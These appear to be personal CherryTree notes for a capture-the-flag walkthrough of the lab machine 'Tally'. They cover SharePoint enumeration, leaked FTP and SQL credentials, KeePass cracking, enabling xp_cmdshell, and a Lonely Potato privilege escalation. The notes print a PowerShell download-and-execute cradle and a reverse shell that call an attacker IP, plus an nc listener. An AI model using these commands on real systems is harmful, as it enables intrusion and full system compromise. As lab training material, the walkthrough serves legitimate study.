<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.59 Tally</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.59 Tally</h1><br/>Nmap showed that 21, 80, 1433 (sql) and smb ports were open as well as others<br />Long nmap showed me that the target was running sharepoint and the default page <a href="http://10.10.10.59/_layouts/15/start.aspx">http://10.10.10.59/_layouts/15/start.aspx</a><br />Sharepoints usual main content page is wiewlsts.aspx<br /><a href="http://10.10.10.59/_layouts/15/viewlsts.aspx">http://10.10.10.59/_layouts/15/viewlsts.aspx</a> shows me some good shit!<br />I am able to get a possible ftp password UTDRSCH53c&quot;$6hys and possible user ftp_user<br /><br />from here I&#39;ve got lots of files and dirs!<br />wget --mirror &#39;ftp://ftp_user:UTDRSCH53c&quot;$6hys@10.10.10.59&#39; to get all the shizzz<br /><br />in going through it I found that /user/tim/files has a kdbx file! (keepass)<br /><br />send the kdbx file to keepass2john to get the hash<br />send the hash to hashcat on my local windows box...<br />got a password!!! simplementeyo<br />I use keepassx to open the kdbx file and I get creds to the finance smb! U finance P Acc0unting<br />smbmap shows me that the smb&#39;s name is ACCT<br />I use my new mount skills to mount the smb drive!!<br /><br />More files and dirs!!<br />in the zz_Migration/binaries/New\ folder dir there is a custom .exe named tester<br />after running strings on tester.exe I was able to find..<br />    DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G<br />    <br />Now lets use these new creds to log into the sql server!<br />    sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G<br />    we are in!!<br />go through the proper steps to turn on xp_cmdshell<br />and we&#39;ve got command execution<br />type user.txt <br /><br />whoami /priv showed that the SeImpersonatePrivilege token is owned<br />lets do rotten potato!!!!!<br /><br /><br /><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a>  has a compiled version of the exploit<br /><a href="https://www.puckiestyle.nl/htb-bounty/">https://www.puckiestyle.nl/htb-bounty/</a>        has a great rightup on the use of lonely potato (even though they call it rotten potato)<br /><br />1.<br />make a file named rev.bat with the contents<br />    powershell.exe -c &quot;iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/ye32.ps1')"">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br />2.<br />add a line to the bottom of Invoke-PowerShellTcp.ps1<br />    Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3232<br />3.<br />pull lonely potato and rev.bat to the target<br />    powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.60:8000/rev.bat',">http://10.10.14.60:8000/rev.bat&#39;,</a> &#39;C:\users\kohsuke\appdata\local\temp\rev.bat&#39;)&quot;<br />4.<br />start nc listener<br />    nc -nlvp 3232<br />5.<br />execute the lonely potato exploit (renamed to rp.exe)<br />    C:\users\kohsuke\appdata\local\temp\rp.exe * C:\users\kohsuke\appdata\local\temp\rev.bat<br />6.<br />    enjoy your system shell!<br />    <br />    <br />    #rooted</div></body></html>